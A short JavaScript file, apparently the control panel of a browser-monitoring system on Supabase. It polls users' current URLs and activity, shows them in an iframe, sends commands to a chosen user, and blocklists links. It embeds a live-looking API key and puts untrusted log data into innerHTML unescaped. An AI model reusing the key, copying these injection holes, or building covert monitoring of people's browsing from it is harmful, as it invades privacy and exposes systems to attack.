const SB_URL = "https://gmvczheriaqouwynfdyv.supabase.co";
const SB_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImdtdmN6aGVyaWFxb3V3eW5mZHl2Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzA0MTM1OTQsImV4cCI6MjA4NTk4OTU5NH0.22wbgR33dCQ1vfB_EdWpxGY5w811_jsf1dqbU1P6dQs";

async function monitorizar() {
    const res = await fetch(`${SB_URL}/rest/v1/logs?select=*&order=timestamp.desc&limit=1`, {headers:{'apikey':SB_KEY}});
    const data = await res.json();
    if(data.length > 0) {
        const u = data[0];
        document.getElementById('live-frame').src = u.url_actual;
        document.getElementById('user-info').innerHTML = `<b>ACTIVO:</b> ${u.usuario_id}<br><b>LINK:</b> ${u.contenido}`;
        document.getElementById('target').value = u.usuario_id;
    }
}

async function enviar(orden) {
    const user = document.getElementById('target').value;
    // Primero borramos órdenes antiguas para que no haya conflicto
    await fetch(`${SB_URL}/rest/v1/ordenes?usuario_id=eq.${user}`, {
        method:'DELETE', headers:{'apikey':SB_KEY}
    });

    // Enviamos la nueva
    await fetch(`${SB_URL}/rest/v1/ordenes`, {
        method: 'POST',
        headers: {'apikey':SB_KEY, 'Content-Type':'application/json'},
        body: JSON.stringify({usuario_id:user, orden:orden, activa:true})
    });
    alert(`Comando ${orden} enviado a ${user}`);
}

async function bloquear() {
    const url = document.getElementById('bad-link').value;
    await fetch(`${SB_URL}/rest/v1/links_bloqueados`, {
        method: 'POST',
        headers: {'apikey':SB_KEY, 'Content-Type':'application/json'},
        body: JSON.stringify({url:url})
    });
    alert("URL añadida a la lista negra.");
}

setInterval(monitorizar, 2000);
